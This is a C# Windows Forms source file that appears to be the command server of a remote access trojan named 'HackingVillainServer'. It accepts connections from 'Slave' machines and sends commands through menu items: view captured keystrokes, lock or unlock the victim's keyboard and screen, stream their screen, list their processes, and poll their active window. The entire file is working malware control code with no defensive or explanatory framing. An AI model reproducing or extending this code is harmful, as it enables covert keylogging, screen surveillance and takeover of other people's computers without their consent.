using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Linq;
using System.IO;
using System.Windows.Forms;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;
using NetworkData;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillainServer
{
    public partial class Form1 : Form
    {
        ISocket _server;
        private List<Slave> _clients = new List<Slave>();
        Thread _listen;
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.BackgroundImageLayout = ImageLayout.Stretch;
            ImageList list = new ImageList();
            list.ImageSize = new Size(128, 128);
            list.Images.Add(Image.FromFile("쟌.png"));
            listView1.LargeImageList = list;
            _server = AweSock.TcpListen(8080);
        }

        ~Form1()
        {
            _listen.Abort();
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);

            Connect();
            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                }
            });
            _listen.Start();
        }

        public void Connect()
        {
            ISocket client = AweSock.TcpAccept(_server);
            _clients.Add(new Slave(client));

            this.listView1.Items.Add(client.GetRemoteEndPoint().ToString(), 0);
        }

        Buffer next;
        ScreenViewer viewer;
        Dictionary<int, List<Data>> _dataBuffer = new Dictionary<int, List<Data>>();

        public void Listen()
        {
            Buffer inBuf = Buffer.New();
            AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
            Buffer.FinalizeBuffer(inBuf);
            var data = Data.Deserialize(Buffer.GetBuffer(inBuf));
            if (_dataBuffer.ContainsKey(data.DataType))
                _dataBuffer[data.DataType].Add(data);
            else
                _dataBuffer.Add(data.DataType, new List<Data>() { data });

            if (!data.IsSplited || data.MaxIndex == data.CurrentIndex)
            {
                Got(data.DataType);
            }
            Thread.Sleep(10);
            /*
            byte[] bytes = Buffer.GetBuffer(inBuf);
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                var img = Image.FromStream(ms);
                this.BackgroundImage = img;
            }
            */
        }

        public void Got(int type)
        {
            Got(Data.Combine(_dataBuffer[type]), type);
            _dataBuffer[type].Clear();
        }

        public void Got(byte[] bytes, int type)
        {
            if (type == 7)
            {
                using (var ms = new MemoryStream(bytes))
                {
                    var img = Image.FromStream(ms);
                    if (viewer != null)
                        viewer.BackgroundImage = img;
                    else
                    {
                        viewer = new ScreenViewer(img);

                        viewer.FormClosed += (b, d) =>
                        {
                            this.Invoke(new MethodInvoker(() =>
                            {
                                Send("Stop Showing");
                            }));
                        };

                        this.Invoke((MethodInvoker)delegate ()
                        {
                            viewer.Show();
                        });
                    }
                }
            }
        }

        public void Send(string msg)
        {
            Buffer b = Buffer.New();
            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
            _clients[0].Socket.SendMessage(b);
        }

        private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;

            var cl = _clients[listView1.SelectedItems[0].Index];
            new EventViewer(cl.KeyEvents).Show();
        }

        private void 활성화EToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("UnLock Key");
        }

        private void 비활성화DToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("Lock Key");
        }

        private void 활성화EToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("UnLock Screen");
        }

        private void 비활성화DToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            Send("Lock Screen");
        }

        bool _readyForProcess = false;
        private void 프로세스ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            _readyForProcess = true;
            Send("Show Me The Process");
        }

        bool _readyForSize = false;
        bool _readyForScreen = false;
        private void 화면SToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1)
                return;
            _readyForSize = true;
            _readyForScreen = true;
            Send("Show Me The Screen");
        }

        bool _readyForWindow;
        private void timer1_Tick(object sender, EventArgs e)
        {
            _readyForWindow = true;
            Send("Current Window");
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (listView1.SelectedItems.Count != 1) return;
            SlaveViewer viewer = new SlaveViewer(_clients[listView1.SelectedItems[0].Index]);
            viewer.Show();
        }
    }
}
